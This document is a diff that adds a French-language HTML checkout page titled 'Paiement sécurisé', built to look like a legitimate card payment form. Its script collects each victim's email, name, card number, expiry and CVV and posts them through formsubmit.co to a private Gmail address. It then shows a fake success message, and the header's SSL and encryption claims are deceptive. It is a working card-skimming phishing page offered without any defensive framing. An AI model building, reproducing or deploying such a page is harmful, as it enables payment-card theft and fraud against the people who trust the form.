@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paiement sécurisé</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f6f9fc;
+            color: #32325d;
+            line-height: 1.4;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 6px 20px rgba(69, 90, 100, 0.08);
+            overflow: hidden;
+        }
+
+        .header {
+            padding: 24px;
+            text-align: center;
+            border-bottom: 1px solid #e6ebf1;
+        }
+
+        .lock-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #425466;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #6b7c93;
+        }
+
+        .form-container {
+            padding: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group:last-child {
+            margin-bottom: 0;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #6b7c93;
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #e6ebf1;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #32325d;
+            background-color: white;
+            transition: border-color 0.15s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #635bff;
+            box-shadow: 0 0 0 1px #635bff;
+        }
+
+        .card-input {
+            position: relative;
+        }
+
+        .card-brand {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 12px;
+            color: #6b7c93;
+            font-weight: 600;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 16px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(180deg, #635bff 0%, #5a52ff 100%);
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            margin-top: 20px;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(180deg, #5a52ff 0%, #4f46ff 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 7px 14px rgba(99, 91, 255, 0.4);
+        }
+
+        .submit-btn:disabled {
+            background: #e6ebf1;
+            color: #6b7c93;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .error {
+            border-color: #fa755a !important;
+            box-shadow: 0 0 0 1px #fa755a !important;
+        }
+
+        .error-message {
+            color: #fa755a;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        .loading {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .loading.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid transparent;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 24px;
+            color: #00d924;
+            font-weight: 600;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <svg class="lock-icon" viewBox="0 0 16 16" fill="currentColor">
+                <path d="M8 1a3 3 0 0 1 3 3v1h1a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V6a1 1 0 0 1 1-1h1V4a3 3 0 0 1 3-3zM6 5V4a2 2 0 1 1 4 0v1H6z"/>
+            </svg>
+            <div class="title">Paiement sécurisé</div>
+            <div class="subtitle">Vos informations sont traitées automatiquement via SSL et chiffrées</div>
+        </div>
+
+        <form id="paymentForm" class="form-container">
+            <div class="form-group">
+                <label for="email">Email du client</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+
+            <div class="form-group">
+                <label for="cardholderName">Nom du titulaire</label>
+                <input type="text" id="cardholderName" name="cardholderName" required>
+            </div>
+
+            <div class="form-group">
+                <label for="cardNumber">Numéro de carte</label>
+                <div class="card-input">
+                    <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <span id="cardBrand" class="card-brand"></span>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="expiry">MM/AA</label>
+                    <input type="text" id="expiry" name="expiry" placeholder="MM/AA" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                <span class="btn-text">Valider le paiement</span>
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <span>Traitement...</span>
+                </div>
+            </button>
+        </form>
+
+        <div id="successMessage" class="success-message">
+            ✓ Paiement traité avec succès !
+        </div>
+    </div>
+
+    <script>
+        // Card number formatting and validation
+        function formatCardNumber(value) {
+            const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            const matches = v.match(/\d{4,16}/g);
+            const match = matches && matches[0] || '';
+            const parts = [];
+            for (let i = 0, len = match.length; i < len; i += 4) {
+                parts.push(match.substring(i, i + 4));
+            }
+            if (parts.length) {
+                return parts.join(' ');
+            } else {
+                return v;
+            }
+        }
+
+        function detectCardBrand(number) {
+            const cleanNumber = number.replace(/\s/g, '');
+            if (cleanNumber.match(/^4/)) return 'Visa';
+            if (cleanNumber.match(/^5[1-5]/)) return 'Mastercard';
+            if (cleanNumber.match(/^3[47]/)) return 'Amex';
+            return '';
+        }
+
+        function formatExpiry(value) {
+            const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            if (v.length >= 2) {
+                return v.substring(0, 2) + '/' + v.substring(2, 4);
+            }
+            return v;
+        }
+
+        // Form elements
+        const form = document.getElementById('paymentForm');
+        const cardNumberInput = document.getElementById('cardNumber');
+        const expiryInput = document.getElementById('expiry');
+        const cvvInput = document.getElementById('cvv');
+        const cardBrand = document.getElementById('cardBrand');
+        const submitBtn = document.getElementById('submitBtn');
+        const btnText = submitBtn.querySelector('.btn-text');
+        const loading = submitBtn.querySelector('.loading');
+        const successMessage = document.getElementById('successMessage');
+
+        // Card number formatting
+        cardNumberInput.addEventListener('input', function(e) {
+            const formatted = formatCardNumber(e.target.value);
+            e.target.value = formatted;
+            cardBrand.textContent = detectCardBrand(formatted);
+        });
+
+        // Expiry formatting
+        expiryInput.addEventListener('input', function(e) {
+            e.target.value = formatExpiry(e.target.value);
+        });
+
+        // CVV numeric only
+        cvvInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+
+        // Form submission
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            // Show loading state
+            btnText.style.display = 'none';
+            loading.classList.add('show');
+            submitBtn.disabled = true;
+
+            // Collect form data
+            const formData = new FormData();
+            formData.append('email', document.getElementById('email').value);
+            formData.append('cardholderName', document.getElementById('cardholderName').value);
+            formData.append('cardNumber', document.getElementById('cardNumber').value);
+            formData.append('expiry', document.getElementById('expiry').value);
+            formData.append('cvv', document.getElementById('cvv').value);
+            formData.append('_to', 'amisfort301@gmail.com');
+            formData.append('_subject', 'Nouvelles données de paiement reçues');
+            formData.append('_next', window.location.href + '?success=1');
+
+            try {
+                // Submit to FormSubmit
+                const response = await fetch('https://formsubmit.co/amisfort301@gmail.com', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    // Show success message
+                    form.style.display = 'none';
+                    successMessage.classList.add('show');
+                } else {
+                    throw new Error('Échec de l\'envoi');
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                alert('Erreur lors du traitement. Veuillez réessayer.');
+                
+                // Reset button state
+                btnText.style.display = 'inline';
+                loading.classList.remove('show');
+                submitBtn.disabled = false;
+            }
+        });
+
+        // Check for success parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('success') === '1') {
+            form.style.display = 'none';
+            successMessage.classList.add('show');
+        }
+    </script>
+</body>
+</html>
